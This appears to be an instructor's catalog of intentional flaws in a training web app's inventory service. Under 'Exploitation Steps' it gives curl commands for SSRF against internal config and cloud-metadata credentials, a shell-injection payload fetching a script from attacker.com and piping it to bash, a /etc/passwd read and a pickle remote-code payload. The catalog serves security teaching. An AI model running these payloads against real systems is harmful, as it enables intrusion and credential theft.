# ShopWorthy Inventory — Vulnerability Catalog

> **Instructor-facing document.** Documents every intentional vulnerability in the `inventory` repository.

---

## VULN-INV-001 — Server-Side Request Forgery (SSRF)

| Field | Detail |
|-------|--------|
| **ID** | VULN-INV-001 |
| **Type** | SSRF |
| **OWASP** | A10:2021 – Server-Side Request Forgery |
| **Severity** | Critical |
| **File** | `app/routes/webhooks.py` ~line 13 |

### Description
The `/webhooks/notify` endpoint accepts a `callback_url` query parameter and makes a POST request to it without any URL validation. An attacker can use this to make the server-side application send requests to internal services.

### Exploitation Steps
```bash
# Read the API internal config endpoint (contains JWT secret)
curl -X POST "http://localhost:5000/webhooks/notify?callback_url=http://api:4000/internal/config&product_id=1&quantity=1"

# Read AWS metadata (on EC2)
curl -X POST "http://localhost:5000/webhooks/notify?callback_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&product_id=1&quantity=1"

# Access payments actuator
curl -X POST "http://localhost:5000/webhooks/notify?callback_url=http://payments:6000/actuator/env&product_id=1&quantity=1"
```

### Chaining
VULN-INV-001 → VULN-API-006: Use SSRF to reach `/internal/config` on the API to obtain the JWT secret, then forge admin tokens.

---

## VULN-INV-002 — Command Injection in Export Endpoint

| Field | Detail |
|-------|--------|
| **ID** | VULN-INV-002 |
| **Type** | Command Injection |
| **OWASP** | A03:2021 – Injection |
| **Severity** | Critical |
| **File** | `app/routes/export.py` ~line 22 |

### Description
The `filename` parameter is interpolated directly into an `os.system()` call without sanitization. An attacker can inject shell commands via the filename.

### Exploitation Steps
```bash
# Create a reverse shell
curl -X POST "http://localhost:5000/export/generate" \
  -H "Content-Type: application/json" \
  -d '{"filename":"report; curl http://attacker.com/shell.sh | bash","format":"csv"}'

# Read /etc/passwd
curl -X POST "http://localhost:5000/export/generate" \
  -H "Content-Type: application/json" \
  -d '{"filename":"x; cat /etc/passwd > /tmp/exports/passwd.txt","format":"csv"}'
```

---

## VULN-INV-003 — Insecure Deserialization (pickle)

| Field | Detail |
|-------|--------|
| **ID** | VULN-INV-003 |
| **Type** | Insecure Deserialization |
| **OWASP** | A08:2021 – Software and Data Integrity Failures |
| **Severity** | Critical |
| **File** | `app/routes/internal.py` ~line 14, `app/utils/serializer.py` |

### Description
The `/internal/deserialize` endpoint accepts a base64-encoded pickle payload and calls `pickle.loads()` on it. Pickle can execute arbitrary Python code during deserialization.

### Exploitation Steps
```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/pwned',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
```

```bash
curl -X POST http://localhost:5000/internal/deserialize \
  -H "Content-Type: application/json" \
  -d '{"data":"<payload from above>"}'
```

---

## VULN-INV-004 — Unauthenticated Internal Endpoints

| Field | Detail |
|-------|--------|
| **ID** | VULN-INV-004 |
| **Type** | Broken Authentication |
| **OWASP** | A07:2021 – Identification and Authentication Failures |
| **Severity** | High |
| **File** | `app/main.py` |

### Description
No authentication middleware is applied. All endpoints (including `/internal/deserialize` and `/export/generate`) are publicly accessible to any caller on the network.

### Exploitation Steps
```bash
# List all inventory without authentication
curl http://localhost:5000/inventory

# Update stock without authentication
curl -X PUT "http://localhost:5000/inventory/1?stock_count=0"

# Access internal deserialization endpoint
curl -X POST http://localhost:5000/internal/deserialize -d '{"data":"..."}'
```

---

## VULN-INV-005 — Outdated Dependencies with Known CVEs

| Field | Detail |
|-------|--------|
| **ID** | VULN-INV-005 |
| **Type** | Vulnerable and Outdated Components |
| **OWASP** | A06:2021 – Vulnerable and Outdated Components |
| **Severity** | High |
| **File** | `requirements.txt` |

### Description
Dependencies are pinned to old versions with known security vulnerabilities.

| Package | Version | CVEs |
|---------|---------|------|
| fastapi | 0.88.0 | Multiple security fixes in later versions |
| requests | 2.27.1 | CVE-2023-32681 (redirect header leak) |
| Pillow | 9.0.0 | CVE-2022-22816, CVE-2022-22817, CVE-2022-22815 |
| pyyaml | 5.3.1 | CVE-2020-14343 (arbitrary code execution via load()) |
| cryptography | 36.0.0 | CVE-2023-0286, CVE-2023-23931 |

### Exploitation Steps
```bash
# Scan with safety
pip install safety
safety check -r requirements.txt
```
